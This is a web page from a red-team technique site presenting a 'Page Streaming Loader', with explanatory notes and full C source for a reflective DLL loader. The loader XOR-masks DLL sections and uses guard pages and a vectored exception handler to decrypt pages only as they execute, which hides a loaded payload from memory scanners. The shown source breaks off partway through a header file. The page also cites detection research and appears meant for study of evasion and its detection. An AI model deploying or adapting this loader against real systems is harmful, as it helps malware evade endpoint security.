# https://tradecraftgarden.org/pagestream.html

Tradecraft Garden

## Page Streaming Loader

Page Streaming is a loader that uses VEH and Guard Pages to de-obfuscate and stream DLL pages into memory as they're needed. As new pages are streamed in, old pages are streamed out. With this technique, only a limited amount of the executing DLL content and resources are visible at any given time.

### Project Files

[ğŸ“ƒÂ  free.c](https://tradecraftgarden.org/pagestream.html#) [ğŸ”®Â  freeandrun.spec](https://tradecraftgarden.org/pagestream.html#) [ğŸ“ƒÂ  guardexec.c](https://tradecraftgarden.org/pagestream.html#) [ğŸ“•Â  LICENSE.txt](https://tradecraftgarden.org/pagestream.html#) [ğŸ“ƒÂ  loader.c](https://tradecraftgarden.org/pagestream.html#) [ğŸ”®Â  loader.spec](https://tradecraftgarden.org/pagestream.html#) [ğŸ”¨Â  Makefile](https://tradecraftgarden.org/pagestream.html#) [ğŸ·Â  rules.yar](https://tradecraftgarden.org/pagestream.html#) [ğŸ“ƒÂ  tcg.h](https://tradecraftgarden.org/pagestream.html#)

### Notes

#### Project Overview

_loader.c_ is a basic DLL loader. It allocates memory, sets up the DLL, runs our guardexec PICO, and then passes execution to our DLL via the _free.c_ PICO (which frees our loader memory).

The _free.c_ PICO is merged into our guardexec PICO and called via an exported function. See _freeandrun.spec_ for more on this.

This project gets its PIC dfr and fixptrs implementation from the [Simple PIC](https://tradecraftgarden.org/simplepic.html) service module.

_guardexec.c_ is where the magic happens. This PICO allocates space for our backup/masked DLL content and sets up the data structures necessary for page streaming. The code is pretty straight forward.

#### Page Streaming

This implementation uses `PAGE_GUARD` permissions to trigger our Vectored Exception Handler (VEH) when our DLL memory is accessed. `PAGE_NOACCESS` is a viable option too. Also, this implementation attempts to keep section permissions accurate (when restoring the page contents). The benefit is the number of eXecutable pages is limited. I imagine there are circumstances where RWX permissions, preserved in the whole region, and PAGE\_GUARD are advantageous (no need to use VirtualProtect).

The `#define MAXVISIBLE` setting is consequential. This is the maximum number of visible regions at one time. This value can't be one, because data accessing instructions (e.g., any loop), will trigger an exception and page streaming logic for each executed instruction. Two is even too low, as code logic going between two pages, can generate a lot of exceptions. Three seems good in my testing. Limits to visibility come with the cost of execution overhead in this technique.

Like all Tradecraft Garden projects, this implementation assumes the loaded DLL is single-threaded. This implementation does not do any synchronization, but if a memory scanning thread is triggering page streaming events and causes instability, I believe synchronizing on a mutex in the exception handler would make the solution more robust.

### Conversation

- [Shellcode Fluctuation](https://github.com/mgeeky/ShellcodeFluctuation) (2021) by Mariusz Banach uses these same tools, but in a different way. His POC hooks Sleep() to: obfuscate a Cobalt Strike Beacon payload in memory, flip its pages to PAGE\_NOACCESS permissions, and when the Sleep completes--the return to a NO\_ACCESS page will fire a VEH where the Beacon is restored.
- [Kong Loader](https://github.com/tijme/kong-loader/) (2024) by Tijme Gommers single steps through an encrypted program, like a debugger. A VEH is used to decrypt the next instruction of the program right before it executes.
- [Detecting anomalous Vectored Exception Handlers on Windows](https://www.nccgroup.com/us/research-blog/detecting-anomalous-vectored-exception-handlers-on-windows/) (2022) by Ollie Whitehouse walks through how to enumerate and find suspicious looking Vectored Exception Handlers (VEHs). Without extra care, this type of scrutiny would certainly make this implementation stand out.
- [You Can Run, but You Can't Hide - Finding the Footprints of Hidden Shellcode](https://www.youtube.com/watch?v=WpzVhCOcIAc) (2023) by John Uhlman discusses using [ETW-Ti to detect tradecraft](https://github.com/jdu2600/EtwTi-FluctuationMonitor) that rely on flipping page permissions.
- [Detecting Injected Code with Page Guards](https://reversing.codes/posts/Detecting-injected-code-with-page-guards/) (2023) by Buzzer. Implications of obscure Windows APIs and techniques created with them often have many uses. By this, what one can do with a set of ideas and tools has offense and defense uses. This blog post discusses using guard pages on malicious code memory to aid in unpacking memory-injected malware.

### License

This project is licensed under the [BSD License](https://opensource.org/license/bsd-3-clause).

## Page Streaming Loader

[ğŸ”™](https://tradecraftgarden.org/pagestream.html#)
guardexec.c
[ğŸ”—](https://tradecraftgarden.org/pagestream.html?file=guardexec.c)

[?](https://tradecraftgarden.org/pagestream.html#)

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67<br>68<br>69<br>70<br>71<br>72<br>73<br>74<br>75<br>76<br>77<br>78<br>79<br>80<br>81<br>82<br>83<br>84<br>85<br>86<br>87<br>88<br>89<br>90<br>91<br>92<br>93<br>94<br>95<br>96<br>97<br>98<br>99<br>100<br>101<br>102<br>103<br>104<br>105<br>106<br>107<br>108<br>109<br>110<br>111<br>112<br>113<br>114<br>115<br>116<br>117<br>118<br>119<br>120<br>121<br>122<br>123<br>124<br>125<br>126<br>127<br>128<br>129<br>130<br>131<br>132<br>133<br>134<br>135<br>136<br>137<br>138<br>139<br>140<br>141<br>142<br>143<br>144<br>145<br>146<br>147<br>148<br>149<br>150<br>151<br>152<br>153<br>154<br>155<br>156<br>157<br>158<br>159<br>160<br>161<br>162<br>163<br>164<br>165<br>166<br>167<br>168<br>169<br>170<br>171<br>172<br>173<br>174<br>175<br>176<br>177<br>178<br>179<br>180<br>181<br>182<br>183<br>184<br>185<br>186<br>187<br>188<br>189<br>190<br>191<br>192<br>193<br>194<br>195<br>196<br>197<br>198<br>199<br>200<br>201<br>202<br>203<br>204<br>205<br>206<br>207<br>208<br>209<br>210<br>211<br>212<br>213<br>214<br>215<br>216<br>217<br>218<br>219<br>220<br>221<br>222<br>223<br>224<br>225<br>226<br>227<br>228<br>229<br>230<br>231<br>232<br>233<br>234<br>235<br>236<br>237<br>238<br>239<br>240<br>241<br>242<br>243<br>244<br>245<br>246<br>247<br>248<br>249<br>250<br>251<br>252<br>253<br>254<br>255<br>256<br>257<br>258<br>259<br>260<br>261<br>262 | `/*`<br>```* Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild`<br>```*`<br>```* Redistribution and use in source and binary forms, with or without modification, are`<br>```* permitted provided that the following conditions are met:`<br>```*`<br>```* 1. Redistributions of source code must retain the above copyright notice, this list of`<br>```* conditions and the following disclaimer.`<br>```*`<br>```* 2. Redistributions in binary form must reproduce the above copyright notice, this list of`<br>```* conditions and the following disclaimer in the documentation and/or other materials provided`<br>```* with the distribution.`<br>```*`<br>```* 3. Neither the name of the copyright holder nor the names of its contributors may be used to`<br>```* endorse or promote products derived from this software without specific prior written`<br>```* permission.`<br>```*`<br>```* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ÃƒÂ¢Ã‚â‚¬Ã‚Å“AS ISÃƒÂ¢Ã‚â‚¬Ã‚Â AND ANY EXPRESS`<br>```* OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF`<br>```* MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE`<br>```* COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,`<br>```* EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF`<br>```* SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)`<br>```* HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR`<br>```* TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,`<br>```* EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`<br>```*/`<br>`#include <windows.h>`<br>`#include "tcg.h"`<br>`WINBASEAPI``PVOID``WINAPI KERNEL32$AddVectoredExceptionHandler (``ULONG``First, PVECTORED_EXCEPTION_HANDLER Handler);`<br>`WINBASEAPI WINBOOL WINAPI KERNEL32$FlushInstructionCache (``HANDLE``hProcess,``LPCVOID``lpBaseAddress,``SIZE_T``dwSize);`<br>`WINBASEAPI``DWORD``WINAPI KERNEL32$GetCurrentThreadId (``VOID``);`<br>`WINBASEAPI``LPVOID``WINAPI KERNEL32$VirtualAlloc (``LPVOID``lpAddress,``SIZE_T``dwSize,``DWORD``flAllocationType,``DWORD``flProtect);`<br>`WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualProtect (``LPVOID``lpAddress,``SIZE_T``dwSize,``DWORD``flNewProtect, PDWORD lpflOldProtect);`<br>`WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualFree (``LPVOID``lpAddress,``SIZE_T``dwSize,``DWORD``dwFreeType);`<br>`WINBASEAPI DECLSPEC_NORETURN``VOID``WINAPI KERNEL32$ExitThread (``DWORD``dwExitCode);`<br>`#define memset(x, y, z) __stosb((unsigned char *)x, y, z);`<br>`#define memcpy(x, y, z) __movsb((unsigned char *)x, (unsigned char *)y, z);`<br>`#define MAXVISIBLE 3`<br>`#define MAXREGIONS 16`<br>`typedef``struct``{`<br>```ULONG_PTR``start;`<br>```ULONG_PTR``end;`<br>```DWORD``permissions;`<br>```char``* source;`<br>`} GUARDREGION;`<br>`typedef``struct``{`<br>```char``* pages[MAXVISIBLE];`<br>```int``index;`<br>`} REGIONQUEUE;`<br>`GUARDREGION regions[MAXREGIONS];`<br>`REGIONQUEUE state;`<br>`#define OLDESTPAGE() state.pages[state.index % MAXVISIBLE]`<br>`/* track our guard pages */`<br>`void``TrackPage(``ULONG_PTR``page) {`<br>```DWORD``oldProt;`<br>```if``(OLDESTPAGE() != NULL) {`<br>```dprintf(``"dropÂ  page %p"``, OLDESTPAGE());`<br>```KERNEL32$VirtualProtect(OLDESTPAGE(), 0x1000, PAGE_READWRITE, &oldProt);`<br>```memset``(OLDESTPAGE(), 0, 0x1000);`<br>```KERNEL32$VirtualProtect(OLDESTPAGE(), 0x1000, PAGE_READWRITE | PAGE_GUARD, &oldProt);`<br>```}`<br>```OLDESTPAGE() = (``char``*)page;`<br>```//dprintf("ADDÂ Â  %p at index %d", OLDESTPAGE(), state.index);`<br>```state.index = (state.index + 1) % MAXVISIBLE;`<br>`}`<br>`/* add a region to guard! */`<br>`void``AddGuardRegion(``char``* payload,``int``len,``char``* src,``DWORD``permissions) {`<br>```for``(``int``x = 0; x < MAXREGIONS; x++) {`<br>```if``(regions[x].start == 0 && regions[x].end == 0) {`<br>```dprintf(``"Setting up shop in %d for %p (%d) perms %d (SRC: %p)"``, x, payload, len, permissions, src);`<br>```regions[x].startÂ Â Â Â Â Â  = (``ULONG_PTR``)payload;`<br>```regions[x].endÂ Â Â Â Â Â Â Â  = (``ULONG_PTR``)payload + len;`<br>```regions[x].sourceÂ Â Â Â Â  = src;`<br>```regions[x].permissions = permissions;`<br>```return``;`<br>```}`<br>```}`<br>```dprintf(``"No empty guard regions!"``);`<br>`}`<br>`/* grab our guard region */`<br>`GUARDREGION * GetGuardRegion(``ULONG_PTR``address) {`<br>```for``(``int``x = 0; x < MAXREGIONS; x++) {`<br>```if``(address >= regions[x].start && address < regions[x].end)`<br>```return``& regions[x];`<br>```}`<br>```return``NULL;`<br>`}`<br>`/*`<br>```* a global variable with our xorkey, we're going to set this to a random value via`<br>```* our loader.spec to demonstrate the 'patch' command applied to COFFs. Note, we set`<br>```* this to a value, because 'patch' can't update an unintialized value.`<br>```*/`<br>`char``xorkey[16] = { 1 };`<br>`/*`<br>```* A simple routine to obfuscate and de-obfuscate memory with our payload stream data.`<br>```*/`<br>`void``applyxor(``char``* data,``DWORD``len) {`<br>```for``(``DWORD``x = 0; x < len; x++) {`<br>```data[x] ^= xorkey[x % 16];`<br>```}`<br>`}`<br>`/*`<br>```* Our VEH to response to page accesses and stream in content.`<br>```*/`<br>`LONG``WINAPI VEHHandler(EXCEPTION_POINTERS * pExceptionPointers) {`<br>```PEXCEPTION_RECORD ExceptionRecord = pExceptionPointers->ExceptionRecord;`<br>```ULONG_PTR``ExceptionAddress;`<br>```ULONG_PTR``PageAddress;`<br>```DWORD``oldprot;`<br>```GUARDREGION * guard = NULL;`<br>```/*`<br>```* I break for guard pages.`<br>```*/`<br>```if``(ExceptionRecord->ExceptionCode != STATUS_GUARD_PAGE_VIOLATION)`<br>```return``EXCEPTION_CONTINUE_SEARCH;`<br>```if``(ExceptionRecord->NumberParameters < 2)`<br>```return``EXCEPTION_CONTINUE_SEARCH;`<br>```/* pull the needed info our of the arguments */`<br>```//AccessTypeÂ Â Â Â Â Â  = ExceptionRecord->ExceptionInformation[0];`<br>```ExceptionAddress = ExceptionRecord->ExceptionInformation[1];`<br>```PageAddressÂ Â Â Â Â  = ExceptionAddress - (ExceptionAddress % 0x1000);`<br>```/* check if the exception occurred somewhere within our regions we're tracking */`<br>```guard = GetGuardRegion(ExceptionAddress);`<br>```if``(guard == NULL) {`<br>```dprintf(``"The exception occurred elsewhere: %p"``, ExceptionAddress);`<br>```return``EXCEPTION_CONTINUE_SEARCH;`<br>```}`<br>```//dprintf("[%p] We have a guard page violation exception!! %p FROM %p", KERNEL32$GetCurrentThreadId(), ExceptionAddress, ExceptionRecord->ExceptionAddress);`<br>```if``(guard->permissions == PAGE_EXECUTE_READ) {`<br>```dprintf(``"LOADÂ  EXEC %p"``, PageAddress);`<br>```}`<br>```else``{`<br>```dprintf(``"LOADÂ  DATA %p"``, PageAddress);`<br>```}`<br>```/* make our target page writeable... */`<br>```ULONG_PTR``srcaddr = (``ULONG_PTR``)guard->source + (PageAddress - guard->start);`<br>```KERNEL32$VirtualProtect((``void``*)PageAddress, 0x1000, PAGE_READWRITE, &oldprot);`<br>```/* stream in ONE page of content from our payload */`<br>```memcpy``(PageAddress, srcaddr, 0x1000);`<br>```/* unmask the page's contents */`<br>```applyxor((``char``*)PageAddress, 0x1000);`<br>```/* change the protection of our streamed in page to the permissions we want */`<br>```KERNEL32$VirtualProtect((``void``*)PageAddress, 0x1000, guard->permissions, &oldprot);`<br>```/* this seems like a REALLY good idea here */`<br>```KERNEL32$FlushInstructionCache((``HANDLE``)-1, (``void``*)PageAddress, 0x1000);`<br>```/* do the book keeping for this page */`<br>```TrackPage(PageAddress);`<br>```/* yeap, the exception is expected and handled... return to our code that was executing as if nothing happened */`<br>```return``EXCEPTION_CONTINUE_EXECUTION;`<br>`}`<br>`#define FLAG(x, y) ( ((x) & (y)) == (y) )`<br>`void``GuardSections(DLLDATA * dll,``char``* dst,``char``* src) {`<br>```DWORD``numberOfSections = dll->NtHeaders->FileHeader.NumberOfSections;`<br>```IMAGE_SECTION_HEADERÂ  * sectionHdrÂ Â Â Â Â Â  = NULL;`<br>```DWORD``permsÂ Â Â Â Â Â Â Â Â Â Â  = 0;`<br>```DWORD``oldprot;`<br>```/* our first section! */`<br>```sectionHdr = (IMAGE_SECTION_HEADER *)PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);`<br>```for``(``int``x = 0; x < numberOfSections; x++) {`<br>```perms = 0;`<br>```/*`<br>```* It's a bad idea to take our writeable memory and subject it to streaming. This will lead to some serious`<br>```* confusion as variable updates, suddenly, become corrupted or aren't taking. Why? Because our stream src`<br>```* is treated as a read-only/constant thing. This implementation doesn't patch updated content in a page`<br>```* back into the stream src for retrieval later. It could, but I didn't feel like going there for now.`<br>```*/`<br>```if``(FLAG(sectionHdr->Characteristics, IMAGE_SCN_MEM_WRITE)) {`<br>```memcpy``(dst + sectionHdr->VirtualAddress, src + sectionHdr->VirtualAddress, sectionHdr->Misc.VirtualSize);`<br>```sectionHdr++;`<br>```continue``;`<br>```}`<br>```if``(FLAG(sectionHdr->Characteristics, IMAGE_SCN_MEM_EXECUTE))`<br>```perms = PAGE_EXECUTE_READ;`<br>```else`<br>```perms = PAGE_READWRITE;`<br>```/* since we're guarding this region, let's "obfuscate" the contents in our stream src */`<br>```applyxor(src + sectionHdr->VirtualAddress, sectionHdr->Misc.VirtualSize);`<br>```/* register this region of memory (and its permissions) in our guard table */`<br>```AddGuardRegion(dst + sectionHdr->VirtualAddress, sectionHdr->Misc.VirtualSize, src + sectionHdr->VirtualAddress, perms);`<br>```/* And, the real magic, setting up guard pages */`<br>```KERNEL32$VirtualProtect(dst + sectionHdr->VirtualAddress, sectionHdr->Misc.VirtualSize, PAGE_READWRITE | PAGE_GUARD, &oldprot);`<br>```/* advance to our next section */`<br>```sectionHdr++;`<br>```}`<br>`}`<br>`/* Set our guard exec shit up */`<br>`void``go(DLLDATA * data,``char``* dstdll) {`<br>```/* get our DLL size */`<br>```int``len = SizeOfDLL(data);`<br>```/* initialize our regions to 0 */`<br>```for``(``int``x = 0; x < MAXREGIONS; x++) {`<br>```regions[x].start = 0;`<br>```regions[x].endÂ Â  = 0;`<br>```}`<br>```/* initialize our state queue to 0 too */`<br>```state.index = 0;`<br>```for``(``int``x = 0; x < MAXVISIBLE; x++)`<br>```state.pages[x] = NULL;`<br>```/* allocate our memory where our obfuscated, ready to restore, payload content will live */`<br>```char``* streamsrc = (``char``*)KERNEL32$VirtualAlloc( NULL, len, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );`<br>```/* copy our payload content over to it! */`<br>```memcpy``(streamsrc, dstdll, len);`<br>```/* set all of our sections to NULL, for now */`<br>```memset``(dstdll, 0, len);`<br>```/* Now, we will walk the DLL, section by section, and setup guard regions and hints in our`<br>```* global table keeping track of these things */`<br>```GuardSections(data, dstdll, streamsrc);`<br>```/* install the handler as our global VEH */`<br>```KERNEL32$AddVectoredExceptionHandler(FALSE, (PVECTORED_EXCEPTION_HANDLER)VEHHandler);`<br>`}` |

## Page Streaming Loader

[ğŸ”™](https://tradecraftgarden.org/pagestream.html#)
loader.c
[ğŸ”—](https://tradecraftgarden.org/pagestream.html?file=loader.c)

[?](https://tradecraftgarden.org/pagestream.html#)

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67<br>68<br>69<br>70<br>71<br>72<br>73<br>74<br>75<br>76<br>77<br>78<br>79<br>80<br>81<br>82<br>83<br>84<br>85<br>86<br>87<br>88<br>89<br>90<br>91<br>92<br>93<br>94<br>95<br>96<br>97<br>98<br>99<br>100<br>101<br>102<br>103<br>104<br>105<br>106<br>107<br>108<br>109<br>110<br>111<br>112<br>113<br>114<br>115<br>116<br>117 | `/*`<br>```* Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild`<br>```*`<br>```* Redistribution and use in source and binary forms, with or without modification, are`<br>```* permitted provided that the following conditions are met:`<br>```*`<br>```* 1. Redistributions of source code must retain the above copyright notice, this list of`<br>```* conditions and the following disclaimer.`<br>```*`<br>```* 2. Redistributions in binary form must reproduce the above copyright notice, this list of`<br>```* conditions and the following disclaimer in the documentation and/or other materials provided`<br>```* with the distribution.`<br>```*`<br>```* 3. Neither the name of the copyright holder nor the names of its contributors may be used to`<br>```* endorse or promote products derived from this software without specific prior written`<br>```* permission.`<br>```*`<br>```* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ÃƒÂ¢Ã‚â‚¬Ã‚Å“AS ISÃƒÂ¢Ã‚â‚¬Ã‚Â AND ANY EXPRESS`<br>```* OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF`<br>```* MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE`<br>```* COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,`<br>```* EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF`<br>```* SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)`<br>```* HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR`<br>```* TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,`<br>```* EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`<br>```*/`<br>`#include <windows.h>`<br>`#include "tcg.h"`<br>`WINBASEAPI``LPVOID``WINAPI KERNEL32$VirtualAlloc (``LPVOID``lpAddress,``SIZE_T``dwSize,``DWORD``flAllocationType,``DWORD``flProtect);`<br>`/*`<br>```* This is the Crystal Palace convention for getting ahold of data linked with this loader.`<br>```*/`<br>`char``__DLLDATA__[0] __attribute__((section(``"my_data"``)));`<br>`char``__GRDDATA__[0] __attribute__((section(``"my_guardexec"``)));`<br>`char``* findAppendedDLL() {`<br>```return``(``char``*)&__DLLDATA__;`<br>`}`<br>`char``* findAppendedGE() {`<br>```return``(``char``*)&__GRDDATA__;`<br>`}`<br>`/*`<br>```* Our PICO loader, have fun, go nuts!`<br>```*/`<br>`char``* SetupCOFF(IMPORTFUNCS * funcs,``char``* srcData) {`<br>```char``* dstCode = NULL;`<br>```char``* dstData = NULL;`<br>```/* allocate memory */`<br>```dstCode = KERNEL32$VirtualAlloc( NULL, PicoCodeSize(srcData), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );`<br>```dstData = KERNEL32$VirtualAlloc( NULL, PicoDataSize(srcData), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE );`<br>```/* load our pico into our destination address, thanks! */`<br>```PicoLoad(funcs, srcData, dstCode, dstData);`<br>```return``dstCode;`<br>`}`<br>`// go() function for guard exec`<br>`typedef``void``(*GUARDEXEC_FUNC_2)(DLLDATA * data,``char``* dstdll);`<br>`// exported function for freeAndRun`<br>`typedef``void``(*FREEANDRUN_FUNC_3)(``char``* loader,``char``* dllEntry,``char``* dllBase);`<br>`/*`<br>```* Get the start address of our PIC DLL loader.`<br>```*/`<br>`void``go();`<br>`char``* getStart() {`<br>```return``(``char``*)go;`<br>`}`<br>`/* this is the linker intrinsic() to get the tag for our exported free and run function */`<br>`int``__tag_freeandrun();`<br>`/*`<br>```* Our reflective loader itself, have fun, go nuts!`<br>```*/`<br>`void``go() {`<br>```DLLDATAÂ Â Â Â Â  data;`<br>```IMPORTFUNCSÂ  funcs;`<br>```/* find our DLL appended to this PIC */`<br>```char``* srcdll = findAppendedDLL();`<br>```/* resolve the functions we'll need */`<br>```funcs.GetProcAddress = GetProcAddress;`<br>```funcs.LoadLibraryAÂ Â  = LoadLibraryA;`<br>```/* parse our DLL! */`<br>```ParseDLL(srcdll, &data);`<br>```/* allocate memory for our DLL and the other stuff within our layout.Â  */`<br>```char``* dstdll = KERNEL32$VirtualAlloc( NULL, SizeOfDLL(&data), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );`<br>```/* load the damned DLL */`<br>```LoadDLL(&data, srcdll, dstdll);`<br>```/* process the imports */`<br>```ProcessImports(&funcs, &data, dstdll);`<br>```/* setup and run our GuardExec nmodule */`<br>```char``* srcge = findAppendedGE();`<br>```char``* dstge = SetupCOFF(&funcs, srcge);`<br>```((GUARDEXEC_FUNC_2)PicoEntryPoint(srcge, dstge))(&data, dstdll);`<br>```/* run DLL via our freeAndRun (free.c) exported function merged into our guardexec PICO */`<br>```((FREEANDRUN_FUNC_3)PicoGetExport(srcge, dstge, __tag_freeandrun())) (getStart(), (``char``*)EntryPoint(&data, dstdll), dstdll);`<br>`}` |

## Page Streaming Loader

[ğŸ”™](https://tradecraftgarden.org/pagestream.html#)
freeandrun.spec
[ğŸ”—](https://tradecraftgarden.org/pagestream.html?file=freeandrun.spec)

[?](https://tradecraftgarden.org/pagestream.html#)

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17 | `#`<br>`# A little doodad to call free() a DLL loader and pass execution to a DLL`<br>`#`<br>`x86:`<br>```# load our free COFF and merge it`<br>```load``"bin/free.x86.o"`<br>```merge`<br>```# export freeAndRun for use with PicoGetExport`<br>```exportfunc``"_freeAndRun"``"___tag_freeandrun"`<br>`x64:`<br>```load``"bin/free.x64.o"`<br>```merge`<br>```exportfunc``"freeAndRun"``"__tag_freeandrun"` |

## Page Streaming Loader

[ğŸ”™](https://tradecraftgarden.org/pagestream.html#)
tcg.h
[ğŸ”—](https://tradecraftgarden.org/pagestream.html?file=tcg.h)

[?](https://tradecraftgarden.org/pagestream.html#)

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67<br>68<br>69<br>70<br>71<br>72<br>73<br>74<br>75<br>76<br>77<br>78<br>79<br>80<br>81<br>82<br>83<br>84<br>85<br>86<br>87<br>88<br>89<br>90<br>91<br>92<br>93<br>94<br>95<br>96<br>97<br>98<br>99<br>100<br>101<br>102 | `/*`<br>```* Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild`<br>```*`<br>```* Redistribution and use in source and binary forms, with or without modification, are`<br>```* permitted provided that the following conditions are met:`<br>```*`<br>```* 1. Redistributions of source code must retain the above copyright notice, this list of`<br>```* conditions and the following disclaimer.`<br>```*`<br>```* 2. Redistributions in binary form must reproduce the above copyright notice, this list of`<br>```* conditions and the following disclaimer in the documentation and/or other materials provided`<br>```* with the distribution.`<br>```*`<br>```* 3. Neither the name of the copyright holder nor the names of its contributors may be used to`<br>```* endorse or promote products derived from this software without specific prior written`<br>```* permission.`<br>```*`<br>```* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS`<br>```* OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF`<br>```* MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE`<br>```* COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,`<br>```* EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF`<br>```* SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)`<br>```* HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR`<br>```* TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,`<br>```* EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`<br>```*/`<br>`// used by both the Pico Loader and DLL loader`<br>`typedef``struct``{`<br>```__typeof__(LoadLibraryA)Â Â  * LoadLibraryA;`<br>```__typeof__(GetProcAddress) * GetProcAddress;`<br>`} IMPORTFUNCS;`<br>`// linker intrinsic to map a function hash to a hook registered via Crystal Palace`<br>`FARPROC __resolve_hook(``DWORD``funcHash);`<br>`/*`<br>```* Structs used by our DLL loader`<br>```*/`<br>`#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )`<br>`#define DEREF( name )*(UINT_PTR *)(name)`<br>`typedef``struct``{`<br>```IMAGE_DOS_HEADERÂ Â Â Â Â  * DosHeader;`<br>```IMAGE_NT_HEADERSÂ Â Â Â Â  * NtHeaders;`<br>```IMAGE_OPTIONAL_HEADER * OptionalHeader;`<br>`} DLLDATA;`<br>`/*`<br>```* utility functions`<br>```*/`<br>`DWORD``adler32sum(unsigned``char``* buffer,``DWORD``length);`<br>`DWORD``ror13hash(``const``char``* c);`<br>`/*`<br>```* printf-style debugging.`<br>```*/`<br>`void``dprintf(``char``* format, ...);`<br>`/*`<br>```* PICO running functions`<br>```*/`<br>`typedef``void``(*PICOMAIN_FUNC)(``char``* arg);`<br>`PICOMAIN_FUNC PicoGetExport(``char``* src,``char``* base,``int``tag);`<br>`PICOMAIN_FUNC PicoEntryPoint(``char``* src,``char``* base);`<br>`int``PicoCodeSize(``char``* src);`<br>`int``PicoDataSize(``char``* src);`<br>`void``PicoLoad(IMPORTFUNCS * funcs,``char``* src,``char``* dstCode,``char``* dstData);`<br>`/*`<br>```* Resolve functions by walking the export address table`<br>```*/`<br>`FARPROC findFunctionByHash(``HANDLE``hModule,``DWORD``wantedFunctionHash);`<br>`HANDLE``findModuleByHash(``DWORD``moduleHash);`<br>`/*`<br>```* DLL parsing and loading 